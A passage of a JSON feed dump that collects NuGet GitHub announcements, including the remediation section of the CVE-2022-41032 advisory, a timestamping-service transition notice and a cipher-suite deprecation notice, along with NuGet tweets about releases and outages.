NuGet.Protocol 5.7.2 version or earlier.\r\n- Any NuGet.exe, NuGet.Commands, NuGet.CommandLine, NuGet.Protocol 4.9.5 version or earlier.\r\n\r\n[GitHub Advisory](https://github.com/NuGet/NuGet.Client/security/advisories/)\r\n\r\n### .NET SDK(s)\r\n\r\n- Any .NET 6.0 application running on .NET 6.0.9 or earlier.\r\n- Any .NET 3.1 application running on .NET Core 3.1.29 or earlier.\r\n\r\n### <a name=\"how-affected\"></a>How do I know if I am affected?\r\n\r\nIf you have a NuGet package or .NET SDK with a version listed in [affected software](#affected-software), you're exposed to the vulnerability.\r\n\r\n### <a name=\"how-fix\"></a>How do I fix the issue?\r\n\r\nTo fix the issue, please install the latest version of .NET 6.0 or .NET Core 3.1 and NuGet (NuGet.exe, NuGet.Commands, NuGet.CommandLine, NuGet.Protocol versions). If you have installed one or more .NET SDKs through Visual Studio, Visual Studio will prompt you to update Visual Studio, which will also update your .NET SDKs.\r\n\r\n\r\n- If you're using NuGet.exe 6.3.0 or lower, you should download and install 6.3.1 from https://dist.nuget.org/win-x86-commandline/v6.3.1/nuget.exe .\r\n\r\n- If you're using NuGet.exe 6.2.1 or lower, you should download and install 6.2.2 from https://dist.nuget.org/win-x86-commandline/v6.2.2/nuget.exe .\r\n\r\n- If you're using NuGet.exe 6.0.2 or lower, you should download and install 6.0.3 from https://dist.nuget.org/win-x86-commandline/v6.0.3/nuget.exe .\r\n\r\n- If you're using NuGet.exe 5.11.2 or lower, you should download and install 5.11.3 from https://dist.nuget.org/win-x86-commandline/v5.11.3/nuget.exe .\r\n\r\n- If you're using NuGet.exe 5.9.2 or lower, you should download and install 5.9.3 from https://dist.nuget.org/win-x86-commandline/v5.9.3/nuget.exe .\r\n\r\n- If you're using NuGet.exe 5.7.2 or lower, you should download and install 5.7.3 from https://dist.nuget.org/win-x86-commandline/v5.7.3/nuget.exe .\r\n\r\n- If you're using NuGet.exe 4.9.5 or lower, you should download and install 4.9.6 from https://dist.nuget.org/win-x86-commandline/v4.9.6/nuget.exe .\r\n\r\n\r\nYou can get the version of NuGet.exe by running the `nuget` command. You should see an output like the following:\r\n\r\n```\r\nNuGet Version: 6.0.0.280\r\n\r\nusage: NuGet <command> [args] [options]\r\n\r\nType 'NuGet help <command>' for help on a specific command.\r\n\r\nTo install additional .NET Core runtimes or SDKs:\r\n\r\n  https://www.nuget.org/downloads\r\n```\r\n\r\nYou can list the versions you have installed by running the `dotnet --info` command. You should see an output like the following:\r\n\r\n```\r\n.NET Core SDK (reflecting any global.json):\r\n\r\n Version:   6.0.300\r\n\r\n Commit:    8473146e7d\r\n\r\n\r\n\r\nRuntime Environment:\r\n\r\n OS Name:     Windows\r\n\r\n OS Version:  10.0.18363\r\n\r\n OS Platform: Windows\r\n\r\n RID:         win10-x64\r\n\r\n Base Path:   C:\\Program Files\\dotnet\\sdk\\6.0.300\\\r\n\r\n\r\n\r\nHost (useful for support):\r\n\r\n  Version: 6.0.5\r\n\r\n  Commit:  8473146e7d\r\n\r\n\r\n\r\n.NET Core SDKs installed:\r\n\r\n  6.0.300 [C:\\Program Files\\dotnet\\sdk]\r\n\r\n\r\n\r\n.NET Core runtimes installed:\r\n\r\n  Microsoft.AspNetCore.App 6.0.5 [C:\\Program Files\\dotnet\\shared\\Microsoft.AspNetCore.App]\r\n\r\n  Microsoft.NETCore.App 6.0.5 [C:\\Program Files\\dotnet\\shared\\Microsoft.NETCore.App]\r\n\r\n  Microsoft.WindowsDesktop.App 6.0.5 [C:\\Program Files\\dotnet\\shared\\Microsoft.WindowsDesktop.App]\r\n\r\n\r\n\r\nTo install additional .NET Core runtimes or SDKs:\r\n\r\n  https://aka.ms/dotnet-download\r\n\r\n```\r\n\r\nIf you're using .NET Core 6.0, you should download and install Runtime 6.0.10 or SDK 6.0.110 (for Visual Studio 2022 v17.0) or SDK 6.0.402 (for Visual Studio 2022 v17.3) from https://dotnet.microsoft.com/download/dotnet-core/6.0.\r\n\r\nIf you're using .NET Core 3.1, you should download and install Runtime 3.1.30 or SDK 3.1.424 (for Visual Studio 2019 v16.9 or Visual Studio 2011 16.11 or Visual Studio 2022 17.0 or Visual Studio 2022 17.1) from https://dotnet.microsoft.com/download/dotnet-core/3.1\r\n\r\n.NET 6.0 and .NET Core 3.1 updates are also available from Microsoft Update. To access this either type \"Check for updates\" in your Windows search, or open Settings, choose Update & Security and then click Check for Updates.\r\n\r\nOnce you have installed the updated runtime or SDK, restart your apps for the update to take effect.\r\n\r\nAdditionally, if you've deployed self-contained applications targeting any of the impacted versions, these applications are also vulnerable and must be recompiled and redeployed.\r\n\r\n## Other Information\r\n\r\n### Reporting Security Issues\r\n\r\nIf you have found a potential security issue in .NET Core 3.1 or .NET 6.0, please email details to [secure@microsoft.com](secure@microsoft.com). Reports may qualify for the Microsoft .NET Core & .NET 5 Bounty. Details of the Microsoft .NET Bounty Program including terms and conditions are at [https://aka.ms/corebounty](https://aka.ms/corebounty).\r\n\r\n### Support\r\n\r\nYou can ask questions about this issue on GitHub in the .NET GitHub organization. The main repo is located at [https://github.com/NuGet/NuGet.Client](https://github.com/NuGet/NuGet.Client). The [Announcements repo](https://github.com/NuGet/Announcements/issues) will contain this bulletin as an issue and will include a link to a discussion issue. You can ask questions in the linked discussion issue.\r\n\r\n### Disclaimer\r\n\r\nThe information provided in this advisory is provided \"as is\" without warranty of any kind. Microsoft disclaims all warranties, either express or implied, including the warranties of merchantability and fitness for a particular purpose. In no event shall Microsoft Corporation or its suppliers be liable for any damages whatsoever including direct, indirect, incidental, consequential, loss of business profits or special damages, even if Microsoft Corporation or its suppliers have been advised of the possibility of such damages. Some states do not allow the exclusion or limitation of liability for consequential or incidental damages so the foregoing limitation may not apply.\r\n\r\n### Acknowledgements\r\n\r\n[Edward Thomson](https://twitter.com/ethomson) \r\n\r\n### External Links\r\n\r\n[CVE 2022-41032](https://www.cve.org/CVERecord?id=CVE-2022-41032)\r\n\r\n### Revisions\r\n\r\nV1.0 (October 11, 2022): Advisory published.\r\n\r\n_Version 1.0_\r\n\r\n_Last Updated 2022-10-11_\r\n"},{"Id":"24368370626","Type":"IssuesEvent","CreatedAt":"2022-10-03T17:00:05","Actor":"dtivel","Repository":"NuGet/Announcements","Organization":"NuGet","RawContent":null,"RelatedAction":"opened","RelatedUrl":"https://github.com/NuGet/Announcements/issues/64","RelatedDescription":"Opened issue \"Transition from Symantec timestamping service to DigiCert timestamping service\" (#64) at NuGet/Announcements","RelatedBody":"Between October 4th, 2022 and October 24, 2022 we will transition from the deprecated Symantec timestamping service currently in use to the DigiCert timestamping service for both Microsoft author signing and NuGet.org repository signing NuGet packages for new package submissions only.\r\n\r\n*  October 4th – October 24th:  Update NuGet.org repository signing to use http://timestamp.digicert.com/. Although all environments (DEV, INT, and PROD) will be updated during this window, http://nuget.org (PROD) specifically will be updated only near the beginning and end of this window.\r\n*  October 18th – 20th:  Update Microsoft author signing to use http://timestamp.digicert.com/.\r\n \r\nWe expect a smooth and quiet transition; however, if you have questions or concerns, either contact support@nuget.org or post [here](https://github.com/NuGet/NuGetGallery/issues/9259).\r\n \r\nPlease see [dotnet/core#7688](https://github.com/dotnet/core/issues/7688) and [Proposal to re-enable signed NuGet package verification](https://github.com/dotnet/designs/blob/main/accepted/2021/signed-package-verification/re-enable-signed-package-verification.md) for context."},{"Id":"23723590840","Type":"IssuesEvent","CreatedAt":"2022-08-30T17:25:48","Actor":"zhhyu","Repository":"NuGet/Announcements","Organization":"NuGet","RawContent":null,"RelatedAction":"opened","RelatedUrl":"https://github.com/NuGet/Announcements/issues/63","RelatedDescription":"Opened issue \"[Connection] Deprecating legacy cipher suites at www.nuget.org\" (#63) at NuGet/Announcements","RelatedBody":"In order to provide a more secure and compliant environment for our customers, we are planning to deprecate legacy cipher suites and only support the following cipher suites at [www.nuget.org](http://www.nuget.org/):\r\n\r\nTLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384\r\nTLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256\r\nTLS_ECDHE_RSA_WITH_AES_256_CBC_SHA384\r\nTLS_ECDHE_RSA_WITH_AES_128_CBC_SHA256\r\nTLS_ECDHE_RSA_WITH_AES_256_CBC_SHA\r\nTLS_ECDHE_RSA_WITH_AES_128_CBC_SHA\r\nTLS_RSA_WITH_AES_256_GCM_SHA384\r\n\r\nBetween 08/31/2022 07:00 PM UTC and 09/02/2022 07:00 PM UTC, we will take a test for this deprecation to understand the broken change for our customers. Based on our telemetry, we expect the impact to be minimal, but if you meet any connection issues at [www.nuget.org](http://www.nuget.org/) or have any questions, do reach out to us at [support@nuget.org](mailto:support@nuget.org) or by commenting on the discussion issue: https://github.com/NuGet/NuGetGallery/issues/9216. We will be closely monitoring our communication channels to assess any unexpected impact."}],"ResultType":"GitHubEvent"},"Twitter":{"ResultType":"TwitterTimeline","Tweets":[{"Id":"1590088546899329024","CreatedAt":"2022-11-08T21:07:06+00:00","UserScreenname":"nuget","Text":"📦 Announcing NuGet 6.4 📦\n\n✅ Central Package Management is production ready\n🌎 Use a PackageReference everywhere with… https://t.co/AaPbNKIxGA","Source":"<a href=\"https://mobile.twitter.com\" rel=\"nofollow\">Twitter Web App</a>","RetweetCount":32,"FavoriteCount":8,"RawContent":null},{"Id":"1575911013328863252","CreatedAt":"2022-09-30T18:10:39+00:00","UserScreenname":"nuget","Text":"🎁NuGet Season of Giving🎁\n\n👍 Working on highly requested features.\n🎃 Hacktoberfest\n🧊 Closing stale issues\n\nWe hope y… https://t.co/OIX6HAnPte","Source":"<a href=\"https://mobile.twitter.com\" rel=\"nofollow\">Twitter Web App</a>","RetweetCount":14,"FavoriteCount":3,"RawContent":null},{"Id":"1566762590335893505","CreatedAt":"2022-09-05T12:18:05+00:00","UserScreenname":"nuget","Text":"At approximately 11:11 AM UTC (~1 hour ago) we began to see increased errors for https://t.co/MK66n2mmT6 in some ge… https://t.co/Hha9zOVSst","Source":"<a href=\"https://about.twitter.com/products/tweetdeck\" rel=\"nofollow\">TweetDeck</a>","RetweetCount":11,"FavoriteCount":3,"RawContent":null},{"Id":"1564312481488592903","CreatedAt":"2022-08-29T18:02:13+00:00","UserScreenname":"nuget","Text":"Announcing syntax highlighting for READMEs on https://t.co/F9kiKfvqkS.\n\n👩‍💻 Automatic language detection.\n✍️ Multi-… https://t.co/4cZeND2aZC","Source":"<a href=\"https://mobile.twitter.com\" rel=\"nofollow\">Twitter Web App</a>","RetweetCount":126,"FavoriteCount":32,"RawContent":null},{"Id":"1557411889466023936","CreatedAt":"2022-08-10T17:01:44+00:00","UserScreenname":"nuget","Text":"🎉 Introducing Transitive Dependencies in Visual Studio 🎉\n\n👀 View transitive dependencies\n🔺 Promote transitive depen… https://t.co/strnTenOBB","Source":"<a href=\"https://mobile.twitter.com\" rel=\"nofollow\">Twitter Web App</a>","RetweetCount":53,"FavoriteCount":15,"RawContent":null},{"Id":"1557099052700925958","CreatedAt":"2022-08-09T20:18:38+00:00","UserScreenname":"nuget","Text":"📦 Announcing NuGet 6.3 📦\n\n🐛 Consume pdbs from packages in PackageReference\n👀 View transitive dependencies in Visual… https://t.co/OYMsZ2IBTa","Source":"<a href=\"https://mobile.twitter.com\" rel=\"nofollow\">Twitter Web App</a>","RetweetCount":48,"FavoriteCount":15,"RawContent":null},{"Id":"1554953163576586241","CreatedAt":"2022-08-03T22:11:38+00:00","UserScreenname":"nuget","Text":"We’ve RCA'ed our recent connectivity issues, and in brief the cause was an inability to handle sudden large spikes… https://t.co/AB6FJRiRbz","Source":"<a href=\"https://mobile.twitter.com\" rel=\"nofollow\">Twitter Web App</a>","RetweetCount":9,"FavoriteCount":1,"RawContent":null},{"Id":"1546878617199804418","CreatedAt":"2022-07-12T15:26:16+00:00","UserScreenname":"nuget","Text":"Imagine you're using the .NET CLI and want to know why a package is included in the dependency graph. What command… https://t.co/jAvoRP7L5w","Source":"<a href=\"https://mobile.twitter.com\" rel=\"nofollow\">Twitter Web App</a>","RetweetCount":3,"FavoriteCount":2,"RawContent":null},{"Id":"1545037921455153155","CreatedAt":"2022-07-07T13:32:00+00:00","UserScreenname":"nuget","Text":"What would you name this feature for Central Package Management?\n\nhttps://t.co/WH5iIJ6OtI\n\nOr something else entire… https://t.co/NZGQ8fAmTE","Source":"<a href=\"https://mobile.twitter.com\" rel=\"nofollow\">Twitter Web App</a>","RetweetCount":2,"FavoriteCount":1,"RawContent":null},{"Id":"1539709411618193409","CreatedAt":"2022-06-22T20:38:24+00:00","UserScreenname":"nuget","Text":"Notice: https://t.co/KVB7werYQh will be read-only from Friday June 24 08:00 PM PDT until 11:59 PM for maintenance.… https://t.co/flURnlZJkk","Source":"<a href=\"https://about.twitter.com/products/tweetdeck\" rel=\"nofollow\">TweetDeck</a>","RetweetCount":8,"FavoriteCount":13,"RawContent":null}]}},"RunOn":"2022-11-25T03:30:24.7939683Z","RunDurationInMilliseconds":1674}